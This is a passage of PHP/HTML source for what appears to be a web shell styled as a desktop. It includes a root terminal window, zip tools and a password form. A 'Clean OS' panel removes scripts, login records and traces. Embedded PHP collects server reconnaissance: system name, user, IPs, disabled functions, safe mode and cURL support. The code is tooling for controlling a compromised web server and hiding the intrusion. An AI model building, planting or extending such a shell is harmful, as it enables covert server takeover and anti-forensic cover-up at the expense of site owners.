            <div class="rename-title"><svg class="zip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true"><linearGradient id="zip_hdr_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#zip_hdr_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15	C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15	C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/><path d="M24.014,35c-0.99,0-1.829-0.314-2.494-0.935c-0.685-0.639-1.032-1.428-1.032-2.344	c0-0.957,0.357-1.755,1.063-2.373c0.45-0.395,0.976-0.658,1.57-0.787h-0.238c-0.914,0-1.657-0.716-1.692-1.63l-0.455-12.175	c-0.018-0.464,0.15-0.904,0.473-1.239C21.531,13.184,21.964,13,22.428,13h3.116c0.465,0,0.898,0.185,1.221,0.521	c0.323,0.335,0.49,0.777,0.47,1.242l-0.481,12.172c-0.036,0.913-0.779,1.627-1.692,1.627h-0.153c0.604,0.131,1.131,0.4,1.577,0.807	c0.681,0.623,1.026,1.414,1.026,2.353c0,0.944-0.34,1.739-1.012,2.364C25.849,34.692,25.013,35,24.014,35z" opacity=".05"/><path d="M24.014,34.5c-0.859,0-1.583-0.269-2.153-0.8c-0.58-0.541-0.874-1.206-0.874-1.979	c0-0.807,0.3-1.479,0.892-1.997c0.571-0.5,1.289-0.754,2.134-0.754c0.857,0,1.576,0.258,2.135,0.768	c0.573,0.523,0.863,1.19,0.863,1.983c0,0.799-0.287,1.472-0.853,1.999C25.604,34.237,24.882,34.5,24.014,34.5z M22.883,28.062	c-0.644,0-1.168-0.505-1.192-1.149l-0.455-12.174c-0.012-0.327,0.106-0.637,0.333-0.873c0.227-0.236,0.532-0.366,0.859-0.366h3.116	c0.328,0,0.633,0.13,0.86,0.367s0.345,0.547,0.331,0.875l-0.481,12.174c-0.025,0.643-0.549,1.146-1.192,1.146H22.883z" opacity=".07"/><path fill="#fff" d="M24.014,34c-0.732,0-1.336-0.222-1.812-0.666s-0.714-0.981-0.714-1.613	c0-0.659,0.24-1.199,0.721-1.62c0.48-0.421,1.082-0.631,1.805-0.631c0.732,0,1.332,0.213,1.798,0.638	c0.467,0.426,0.7,0.963,0.7,1.613c0,0.659-0.231,1.203-0.693,1.633S24.755,34,24.014,34z"/><path fill="#fff" d="M26.236,14.721l-0.481,12.175c-0.015,0.372-0.321,0.666-0.693,0.666h-2.179	c-0.373,0-0.679-0.295-0.693-0.668L21.735,14.72c-0.015-0.393,0.3-0.72,0.693-0.72h3.116C25.937,14,26.252,14.327,26.236,14.721z"/></svg> Zip</div>
        <button class="rename-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="rename-body" style="padding:12px;">
            <div class="input-pill" style="margin:12px auto; max-width:480px;">
                <span class="material-symbols-rounded">package_2</span>
                <input type="text" class="zip-input" placeholder="Archive name (.zip)" autocomplete="off" aria-label="Archive name">
            </div>
        </div>
        <div class="rename-footer" style="display:flex; align-items:center; justify-content:center; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.20);">
            <button class="zip-save icon-action icon-confirm" type="button" title="Create ZIP" aria-label="Create ZIP"><span class="material-symbols-rounded">check_circle</span></button>
        </div>
    </div>
    <!-- Layer to hold Zip windows -->
    <div id="zip-layer"></div>
    <!-- Unzip popup template -->
    <div class="unzip-window" id="unzip-template" role="dialog" aria-label="Unzip" style="display:none;">
        <div class="rename-titlebar">
            <div class="rename-title"><svg class="unzip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true"><linearGradient id="unzip_hdr_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#unzip_hdr_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15	C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15	C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/><path d="M24.014,35c-0.99,0-1.829-0.314-2.494-0.935c-0.685-0.639-1.032-1.428-1.032-2.344	c0-0.957,0.357-1.755,1.063-2.373c0.45-0.395,0.976-0.658,1.57-0.787h-0.238c-0.914,0-1.657-0.716-1.692-1.63l-0.455-12.175	c-0.018-0.464,0.15-0.904,0.473-1.239C21.531,13.184,21.964,13,22.428,13h3.116c0.465,0,0.898,0.185,1.221,0.521	c0.323,0.335,0.49,0.777,0.47,1.242l-0.481,12.172c-0.036,0.913-0.779,1.627-1.692,1.627h-0.153c0.604,0.131,1.131,0.4,1.577,0.807	c0.681,0.623,1.026,1.414,1.026,2.353c0,0.944-0.34,1.739-1.012,2.364C25.849,34.692,25.013,35,24.014,35z" opacity=".05"/><path d="M24.014,34.5c-0.859,0-1.583-0.269-2.153-0.8c-0.58-0.541-0.874-1.206-0.874-1.979	c0-0.807,0.3-1.479,0.892-1.997c0.571-0.5,1.289-0.754,2.134-0.754c0.857,0,1.576,0.258,2.135,0.768	c0.573,0.523,0.863,1.19,0.863,1.983c0,0.799-0.287,1.472-0.853,1.999C25.604,34.237,24.882,34.5,24.014,34.5z M22.883,28.062	c-0.644,0-1.168-0.505-1.192-1.149l-0.455-12.174c-0.012-0.327,0.106-0.637,0.333-0.873c0.227-0.236,0.532-0.366,0.859-0.366h3.116	c0.328,0,0.633,0.13,0.86,0.367s0.345,0.547,0.331,0.875l-0.481,12.174c-0.025,0.643-0.549,1.146-1.192,1.146H22.883z" opacity=".07"/><path fill="#fff" d="M24.014,34c-0.732,0-1.336-0.222-1.812-0.666s-0.714-0.981-0.714-1.613	c0-0.659,0.24-1.199,0.721-1.62c0.48-0.421,1.082-0.631,1.805-0.631c0.732,0,1.332,0.213,1.798,0.638	c0.467,0.426,0.7,0.963,0.7,1.613c0,0.659-0.231,1.203-0.693,1.633S24.755,34,24.014,34z"/><path fill="#fff" d="M26.236,14.721l-0.481,12.175c-0.015,0.372-0.321,0.666-0.693,0.666h-2.179	c-0.373,0-0.679-0.295-0.693-0.668L21.735,14.72c-0.015-0.393,0.3-0.72,0.693-0.72h3.116C25.937,14,26.252,14.327,26.236,14.721z"/></svg> Unzip</div>
        <button class="rename-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="rename-body" style="padding:12px;">
            <div class="input-pill" style="margin:12px auto; max-width:480px;">
                <span class="material-symbols-rounded">create_new_folder</span>
                <input type="text" class="unzip-input" placeholder="Extract to folder" autocomplete="off" aria-label="Extract folder">
            </div>
        </div>
        <div class="rename-footer" style="display:flex; align-items:center; justify-content:center; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.20);">
            <button class="unzip-save icon-action icon-confirm" type="button" title="Unzip" aria-label="Unzip"><span class="material-symbols-rounded">check_circle</span></button>
        </div>
    </div>
    <!-- Layer to hold Unzip windows -->
    <div id="unzip-layer"></div>
    <!-- Settings popup template -->
    <div class="settings-window" id="settings-template" role="dialog" aria-label="Settings" style="display:none;">
        <div class="settings-titlebar">
            <div class="settings-title">Settings</div>
            <button class="settings-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="settings-body">
            <div class="settings-row">
                <div class="label">Current password</div>
                <span class="material-symbols-rounded pw-icon" aria-hidden="true">password</span>
                <input class="settings-input" type="password" id="set-current" placeholder="Enter current password" aria-label="Current password" />
                <button class="settings-eye" type="button" id="set-cur-toggle" title="Show/Hide"><span class="material-symbols-rounded">visibility</span></button>
            </div>
            <div class="settings-row">
                <div class="label">New password</div>
                <span class="material-symbols-rounded pw-icon" aria-hidden="true">password</span>
                <input class="settings-input" type="password" id="set-new" placeholder="Enter new password" aria-label="New password" />
                <button class="settings-eye" type="button" id="set-new-toggle" title="Show/Hide"><span class="material-symbols-rounded">visibility</span></button>
            </div>
            <div class="settings-row">
                <div class="label">Confirm password</div>
                <span class="material-symbols-rounded pw-icon" aria-hidden="true">password</span>
                <input class="settings-input" type="password" id="set-confirm" placeholder="Confirm new password" aria-label="Confirm password" />
                <button class="settings-eye" type="button" id="set-conf-toggle" title="Show/Hide"><span class="material-symbols-rounded">visibility</span></button>
            </div>
        </div>
        <div class="settings-actions">
            <button class="btn btn-gen" type="button" id="set-generate" title="Generate"><span class="material-symbols-rounded">key</span><span>Generate</span></button>
            <button class="btn btn-copy" type="button" id="set-copy" title="Copy"><span class="material-symbols-rounded">content_copy</span><span>Copy</span></button>
            <div style="flex:1"></div>
            <button class="btn btn-save" type="button" id="set-save" title="Save"><span class="material-symbols-rounded">check_circle</span><span>Save</span></button>
        </div>
    </div>
    <!-- Layer to hold Settings windows -->
    <div id="settings-layer"></div>
    <!-- Confirm popup template -->
    <div class="confirm-window" id="confirm-template" role="dialog" aria-label="Confirm" style="display:none; position: fixed; width: min(92vw, 320px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 12px 24px rgba(0,0,0,0.35); color:#cfd6df; z-index: 10003;">
        <div class="confirm-titlebar" style="display:flex; align-items:center; gap:8px; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.20); border-radius:12px 12px 0 0; cursor: move; user-select: none;">
            <div class="confirm-title" style="flex:1; text-align:center; font-weight:600; letter-spacing:0.2px;"><span class="material-symbols-rounded" aria-hidden="true">help</span> Confirm</div>
            <button class="confirm-close" title="Close" aria-label="Close" style="width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer;"><span class="material-symbols-rounded" style="color:DarkRed;">cancel</span></button>
        </div>
        <div class="confirm-body" style="padding:12px; display:flex; align-items:center; gap:10px; color:#cfd6df;">
            <span class="material-symbols-rounded" aria-hidden="true" style="font-size:20px; color:#f59e0b;">warning</span>
            <div class="confirm-message" style="flex:1;">Are you sure you want to change password?</div>
        </div>
        <div class="confirm-actions" style="display:flex; align-items:center; justify-content:center; gap:10px; padding:10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.12); border-radius:0 0 12px 12px;">
            <button class="confirm-no" type="button" title="No" aria-label="No" style="border:1px solid var(--border); border-radius:8px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px;">
                <span class="material-symbols-rounded" style="color:#ef4444;">cancel</span>
                <span>No</span>
            </button>
            <button class="confirm-yes" type="button" title="Yes" aria-label="Yes" style="border:1px solid var(--border); border-radius:8px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px;">
                <span class="material-symbols-rounded" style="color:#22c55e;">check_circle</span>
                <span>Yes</span>
            </button>
        </div>
    </div>
    <!-- Layer to hold Confirm windows -->
    <div id="confirm-layer"></div>
    <!-- Wallpaper popup template -->
    <div class="wallpaper-window" id="wallpaper-template" role="dialog" aria-label="Wallpaper" style="display:none;">
        <div class="wallpaper-titlebar">
            <div class="wallpaper-title">Wallpaper</div>
            <button class="wallpaper-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="wallpaper-body">
            <input class="wp-url" type="text" placeholder="Enter image URL (http/https/data URI or local filename)" aria-label="Wallpaper URL" />
            <button class="wp-btn wp-type1" type="button" title="Type 1 (Mac)" aria-label="Type 1"><span class="material-symbols-rounded">image</span><span class="wp-thumb" data-type="type1"></span> Type 1</button>
            <button class="wp-btn wp-type2" type="button" title="Type 2 (Old default)" aria-label="Type 2"><span class="material-symbols-rounded">palette</span><span class="wp-thumb" data-type="type2"></span> Type 2</button>
            <button class="wp-btn wp-type3" type="button" title="Type 3 (Green 3D balls)" aria-label="Type 3"><span class="material-symbols-rounded">blur_on</span><span class="wp-thumb" data-type="type3"></span> Type 3</button>
            <button class="wp-btn wp-type4" type="button" title="Type 4 (Alphacoders image)" aria-label="Type 4"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type4"></span> Type 4</button>
            <button class="wp-btn wp-type5" type="button" title="Type 5 (Windows XP)" aria-label="Type 5"><span class="material-symbols-rounded">desktop_windows</span><span class="wp-thumb" data-type="type5"></span> Type 5</button>
            <button class="wp-btn wp-type6" type="button" title="Type 6 (Windows 10 Pro)" aria-label="Type 6"><span class="material-symbols-rounded">monitor</span><span class="wp-thumb" data-type="type6"></span> Type 6</button>
            <button class="wp-btn wp-type7" type="button" title="Type 7 (Windows 11)" aria-label="Type 7"><span class="material-symbols-rounded">desktop_windows</span><span class="wp-thumb" data-type="type7"></span> Type 7</button>
            <button class="wp-btn wp-type8" type="button" title="Type 8 (Anonymous Mask)" aria-label="Type 8"><span class="material-symbols-rounded">person</span><span class="wp-thumb" data-type="type8"></span> Type 8</button>
            <button class="wp-btn wp-type9" type="button" title="Type 9 (Alphacoders)" aria-label="Type 9"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type9"></span> Type 9</button>
            <button class="wp-btn wp-type10" type="button" title="Type 10 (Alphacoders)" aria-label="Type 10"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type10"></span> Type 10</button>
            <button class="wp-btn wp-type11" type="button" title="Type 11 (Alphacoders)" aria-label="Type 11"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type11"></span> Type 11</button>
            <button class="wp-btn wp-type12" type="button" title="Type 12 (Alphacoders)" aria-label="Type 12"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type12"></span> Type 12</button>
            <button class="wp-btn wp-type13" type="button" title="Type 13 (Alphacoders)" aria-label="Type 13"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type13"></span> Type 13</button>
            <button class="wp-btn wp-type14" type="button" title="Type 14 (Alphacoders)" aria-label="Type 14"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type14"></span> Type 14</button>
            <button class="wp-btn wp-type15" type="button" title="Type 15 (Alphacoders)" aria-label="Type 15"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type15"></span> Type 15</button>
            <button class="wp-btn wp-type16" type="button" title="Type 16 (Alphacoders)" aria-label="Type 16"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type16"></span> Type 16</button>
            <button class="wp-btn wp-type17" type="button" title="Type 17 (Alphacoders)" aria-label="Type 17"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type17"></span> Type 17</button>
            <button class="wp-btn wp-type18" type="button" title="Type 18 (Alphacoders)" aria-label="Type 18"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type18"></span> Type 18</button>
            <button class="wp-btn wp-type19" type="button" title="Type 19 (Alphacoders)" aria-label="Type 19"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type19"></span> Type 19</button>
            <button class="wp-btn wp-type20" type="button" title="Type 20 (Alphacoders)" aria-label="Type 20"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type20"></span> Type 20</button>
            <button class="wp-btn wp-type21" type="button" title="Type 21 (Alphacoders)" aria-label="Type 21"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type21"></span> Type 21</button>
            <button class="wp-btn wp-type22" type="button" title="Type 22 (Alphacoders)" aria-label="Type 22"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type22"></span> Type 22</button>
            <button class="wp-btn wp-type23" type="button" title="Type 23 (Alphacoders)" aria-label="Type 23"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type23"></span> Type 23</button>
            <button class="wp-btn wp-type24" type="button" title="Type 24 (Alphacoders)" aria-label="Type 24"><span class="material-symbols-rounded">wallpaper</span><span class="wp-thumb" data-type="type24"></span> Type 24</button>
            <button class="wp-btn wp-apply" type="button" title="Change" aria-label="Change"><span class="material-symbols-rounded">check_circle</span> Change</button>
            <button class="wp-btn wp-reset" type="button" title="Reset" aria-label="Reset"><span class="material-symbols-rounded">restart_alt</span> Reset</button>
            <div class="wallpaper-footer">© wall.alphacoders.com — All rights reserved. Download any free wallpaper from this website.</div>
        </div>
    </div>
    <!-- Layer to hold Wallpaper windows -->
    <div id="wallpaper-layer"></div>
    
    <!-- CMD popup template -->
    <div class="cmd-window" id="cmd-template" role="dialog" aria-label="CMD" style="display:none;">
        <div class="cmd-titlebar">
            <div class="cmd-title">root@root:~</div>
            <button class="cmd-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="cmd-body">
            <div class="cmd-output" aria-live="polite"></div>
            <div class="cmd-input-row">
                <span class="cmd-prompt" aria-hidden="true"><span class="sym">(</span><span class="u">oscoding</span>@<span class="h">root</span><span class="sym">)</span><span class="dir">[~]</span> <span class="sym">$</span></span>
                <input class="cmd-input" type="text" placeholder="Type a command (help, echo, date, clear, sum, open)" aria-label="Command input" />
            </div>
        </div>
    </div>
    <!-- Layer to hold CMD windows -->
    <div id="cmd-layer"></div>
    <!-- Context menu and Paste window templates -->
    <div class="ctx-menu" id="ctx-menu" role="menu" aria-hidden="true">
      <button class="ctx-item" id="ctx-copy" type="button"><span class="material-symbols-rounded" aria-hidden="true">content_copy</span><span>Copy</span><span class="ctx-kbd">Ctrl/Cmd+C</span></button>
      <button class="ctx-item" id="ctx-paste" type="button"><span class="material-symbols-rounded" aria-hidden="true">content_paste</span><span>Paste</span><span class="ctx-kbd">Ctrl/Cmd+V</span></button>
      <button class="ctx-item" id="ctx-paste-oneline" type="button"><span class="material-symbols-rounded" aria-hidden="true">content_paste_go</span><span>Paste (strip newlines)</span></button>
      <button class="ctx-item" id="ctx-select" type="button"><span class="material-symbols-rounded" aria-hidden="true">select_all</span><span>Select All</span><span class="ctx-kbd">Ctrl/Cmd+A</span></button>
      <div class="ctx-sep"></div>
      <button class="ctx-item" id="ctx-copy-command" type="button"><span class="material-symbols-rounded" aria-hidden="true">content_copy</span><span>Copy Current Command</span></button>
      <button class="ctx-item" id="ctx-undo" type="button"><span class="material-symbols-rounded" aria-hidden="true">undo</span><span>Undo</span><span class="ctx-kbd">Ctrl/Cmd+Z</span></button>
      <button class="ctx-item" id="ctx-redo" type="button"><span class="material-symbols-rounded" aria-hidden="true">redo</span><span>Redo</span><span class="ctx-kbd">Ctrl+Y · Shift+Cmd/Ctrl+Z</span></button>
      <div class="ctx-sep"></div>
      <button class="ctx-item" id="ctx-open" type="button"><span class="material-symbols-rounded" aria-hidden="true">open_in_new</span><span>Open Link in New Tab</span></button>
    </div>
    
    <!-- Clean OS popup template -->
    <div class="clean-window" id="clean-template" role="dialog" aria-label="Clean OS" style="display:none;">
        <div class="clean-titlebar">
            <div class="clean-title">Clean OS</div>
            <button class="clean-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="clean-body">
            <svg class="clean-icon clean-icon-large" viewBox="0 0 24 24" role="img" aria-label="Cleaning animation">
                <g fill="none" stroke="Chartreuse" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path class="broom-stick" d="M5 21 L19 5"/>
                    <path class="broom-head" d="M17 7 C16 9, 14 11, 12 12"/>
                    <path class="broom-bristle" d="M13 11 C12 12, 10 13, 8 14"/>
                    <circle class="sparkle s1" cx="7" cy="6" r="1"/>
                    <circle class="sparkle s2" cx="21" cy="12" r="1.2"/>
                    <circle class="sparkle s3" cx="12" cy="21" r="1"/>
                </g>
            </svg>
            <div class="clean-intro">Delete scripts, clear cookies/local storage, and remove traces. Use Advanced carefully.</div>
            <div class="clean-actions">
                <button class="btn" type="button" id="clean-browser" title="Clean Browser"><span class="material-symbols-rounded">cookie</span><span>Clean Browser</span></button>
                <button class="btn" type="button" id="clean-server" title="Clean Server"><span class="material-symbols-rounded">delete</span><span>Clean Server</span></button>
                
                <button class="btn" type="button" id="clean-verify-ok" title="Verify"><span class="material-symbols-rounded">verified</span><span>Verify</span></button>
            </div>
            <div class="clean-checks">
                <label class="clean-check"><input type="checkbox" id="chk-trash"> <span>Clear trash log</span></label>
                <label class="clean-check"><input type="checkbox" id="chk-password"> <span>Remove password file</span></label>
                <label class="clean-check"><input type="checkbox" id="chk-lastlogin"> <span>Clear .lastlogin files</span></label>
                <label class="clean-check"><input type="checkbox" id="chk-remove"> <span>Clear remove</span></label>
            </div>
            <div class="clean-result" id="clean-result" aria-live="polite"></div>
        </div>
    </div>
    <!-- Layer to hold Clean OS windows -->
    <div id="clean-layer"></div>
    <!-- Server Info popup template -->
    <?php
        $unameFull = php_uname();
        $unameOS = php_uname('s');
        $unameRel = php_uname('r');
        $unameVer = php_uname('v');
        $unameMachine = php_uname('m');
        $phpVer = PHP_VERSION;
        $serverSoft = (string)($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown');
        $serverIP = (string)($_SERVER['SERVER_ADDR'] ?? 'Unknown');
        $clientIP = (string)($_SERVER['REMOTE_ADDR'] ?? 'Unknown');
        $safeMode = (function_exists('ini_get')) ? (ini_get('safe_mode') ? 'ON' : 'OFF') : 'OFF';
        // Current user
        $userName = 'Unknown';
        if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
            $uid = @posix_geteuid();
            $pw = ($uid !== false) ? (@posix_getpwuid($uid) ?: []) : [];
            $userName = (string)($pw['name'] ?? 'Unknown');
        } else {
            $userName = (string)(get_current_user() ?: 'Unknown');
        }
        // Disk space
        $diskTotal = @disk_total_space($BASE_DIR);
        $diskFree = @disk_free_space($BASE_DIR);
        $diskUsed = (is_numeric($diskTotal) && is_numeric($diskFree)) ? max(0, $diskTotal - $diskFree) : null;
        $fmtBytes = function($b){ if (!is_numeric($b)) return 'Unknown'; $u=['B','KB','MB','GB','TB']; $i=0; while ($b>=1024 && $i<count($u)-1){ $b/=1024; $i++; } return sprintf('%.2f %s', $b, $u[$i]); };
        $hddInfo = 'Unknown';
        if (is_numeric($diskTotal) && is_numeric($diskFree)) {
            $hddInfo = 'Total ' . $fmtBytes($diskTotal) . ', Used ' . $fmtBytes($diskUsed) . ', Free ' . $fmtBytes($diskFree);
        }
        // Distro name
        $distro = 'Unknown';
        try {
            $osRel = @file_get_contents('/etc/os-release');
            if (is_string($osRel) && $osRel !== '') {
                if (preg_match('/^PRETTY_NAME="?([^"\n]+)"?/m', $osRel, $m)) { $distro = $m[1]; }
                elseif (preg_match('/^NAME="?([^"\n]+)"?/m', $osRel, $m2)) { $distro = $m2[1]; }
            }
        } catch (Throwable $e) {}
        // Supported databases
        $dbs = [];
        $addIf = function($cond, $name) use (&$dbs){ if ($cond) $dbs[] = $name; };
        $addIf(function_exists('mysqli_connect') || extension_loaded('mysqli'), 'MySQLi');
        $addIf(class_exists('PDO', false) && extension_loaded('pdo_mysql'), 'PDO MySQL');
        $addIf(class_exists('PDO', false) && extension_loaded('pdo_pgsql'), 'PDO PostgreSQL');
        $addIf(class_exists('PDO', false) && extension_loaded('pdo_sqlite'), 'PDO SQLite');
        $addIf(extension_loaded('sqlite3'), 'SQLite3');
        $addIf(extension_loaded('pgsql'), 'PostgreSQL');
        $addIf(extension_loaded('mongodb'), 'MongoDB');
        $dbList = $dbs ? implode(', ', $dbs) : 'None detected';
        // Apache modules
        $apacheMods = 'Not available';
        if (function_exists('apache_get_modules')) {
            try { $mods = @apache_get_modules(); if (is_array($mods)) { $apacheMods = implode(', ', $mods); } } catch (Throwable $e) {}
        }
        // Disabled PHP functions
        $disabledFns = '';
        try { $df = (string)ini_get('disable_functions'); $disabledFns = $df !== '' ? $df : 'None'; } catch (Throwable $e) { $disabledFns = 'Unknown'; }
        // cURL support
$curlSupport = function_exists('curl_version') ? 'Yes' : 'No';
// Safe mode (deprecated in modern PHP, but show status for legacy setups)
$safeMode = (function(){
    try {
        $v = @ini_get('safe_mode');
        if ($v === false || $v === '' || strtolower((string)$v) === '0' || strtolower((string)$v) === 'off') return 'No';
        return 'Yes';
    } catch (Throwable $e) { return 'No'; }
})();
    ?>
        <div class="serverinfo-window" id="serverinfo-template" role="dialog" aria-label="Server Info" style="display:none;">
            <div class="serverinfo-titlebar">
            <div class="serverinfo-title">Server Info</div>
            <button class="serverinfo-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="serverinfo-body">
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">computer</span><span>Uname</span></div><div class="value"><textarea class="serverinfo-textarea singleline" id="unameText" readonly rows="1" title="Uname"><?= h($unameFull) ?></textarea></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">person</span><span>User</span></div><div class="value"><?= h($userName) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">code</span><span>PHP</span></div><div class="value"><?= h($phpVer) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">storage</span><span>HDD</span></div><div class="value"><?= h($hddInfo) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">dns</span><span>Server IP</span></div><div class="value"><?= h($serverIP) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">public</span><span>Client IP</span></div><div class="value"><?= h($clientIP) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">shield</span><span>Safe mode</span></div><div class="value"><span class="status-dot <?= ($safeMode === 'Yes') ? 'status-green' : 'status-red' ?>"></span><span class="status-text <?= ($safeMode === 'Yes') ? 'status-green' : 'status-red' ?>"><?= h($safeMode) ?></span></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">settings</span><span>OS version</span></div><div class="value"><?= h($unameOS . ' ' . $unameRel . ' ' . $unameVer . ' (' . $unameMachine . ')') ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">info</span><span>Distro name</span></div><div class="value"><?= h($distro) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">table_chart</span><span>Supported databases</span></div><div class="value"><?= h($dbList) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">settings_suggest</span><span>Server software</span></div><div class="value"><?= h($serverSoft) ?></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">extension</span><span>Loaded Apache modules</span></div><div class="value"><textarea class="serverinfo-textarea" readonly rows="4" aria-label="Loaded Apache modules text"><?= h($apacheMods) ?></textarea></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">block</span><span>Disabled PHP Functions</span></div><div class="value"><textarea class="serverinfo-textarea" readonly rows="4" aria-label="Disabled PHP Functions text"><?= h($disabledFns) ?></textarea></div></div>
<div class="serverinfo-row"><div class="label"><span class="material-symbols-rounded icon">link</span><span>cURL support</span></div><div class="value"><span class="status-dot <?= ($curlSupport === 'Yes') ? 'status-green' : 'status-red' ?>"></span><span class="status-text <?= ($curlSupport === 'Yes') ? 'status-green' : 'status-red' ?>"><?= h($curlSupport) ?></span></div></div>
        </div>
        <div class="serverinfo-actions">
        </div>
    </div>
    <!-- Layer to hold Server Info windows -->
    <div id="serverinfo-layer"></div>
    <!-- Errors popup template -->
    <div class="errors-window" id="errors-template" role="dialog" aria-label="Errors" style="display:none;">
        <div class="errors-titlebar">
            <div class="errors-title"><span class="material-symbols-rounded errors-icon" aria-hidden="true">warning</span> Errors</div>
            <button class="errors-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="errors-body">
            <div class="errors-summary" id="errors-summary">Press Scan to analyze the error log.</div>
            <textarea class="errors-output" id="errors-output" readonly aria-label="Errors output"></textarea>
            <div class="errors-term" id="errors-term">$ <span class="cursor"></span></div>
            <div class="errors-actions">
                <button class="btn errors-scan" id="errors-scan-btn" type="button" title="Scan" aria-label="Scan"><span class="material-symbols-rounded">document_scanner</span></button>
                <button class="btn errors-pause" id="errors-pause-btn" type="button" title="Pause" aria-label="Pause"><span class="material-symbols-rounded">pause</span></button>
                <button class="btn errors-resume" id="errors-resume-btn" type="button" title="Resume" aria-label="Resume"><span class="material-symbols-rounded">play_arrow</span></button>
                <button class="btn errors-clear" id="errors-clear-btn" type="button" title="Clear Log" aria-label="Clear Log"><span class="material-symbols-rounded">delete</span></button>
            </div>
        </div>
    </div>
    <!-- HOW popup template -->
    <div class="how-window" id="how-template" role="dialog" aria-label="HOW" style="display:none;">
        <div class="how-titlebar">
            <div class="how-title"><span class="material-symbols-rounded" aria-hidden="true">help</span> HOW</div>
            <button class="how-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="how-body">
            <div class="how-list" id="how-list"></div>
        </div>
    </div>
    <!-- Layer to hold HOW windows -->
    <div id="how-layer"></div>
    <!-- CMD Help popup template -->
    <div class="cmdhelp-window" id="cmdhelp-template" role="dialog" aria-label="CMD Help" style="display:none;">
        <div class="cmdhelp-titlebar">
            <div class="cmdhelp-title"><span class="material-symbols-rounded" aria-hidden="true">menu_book</span> CMD Help</div>
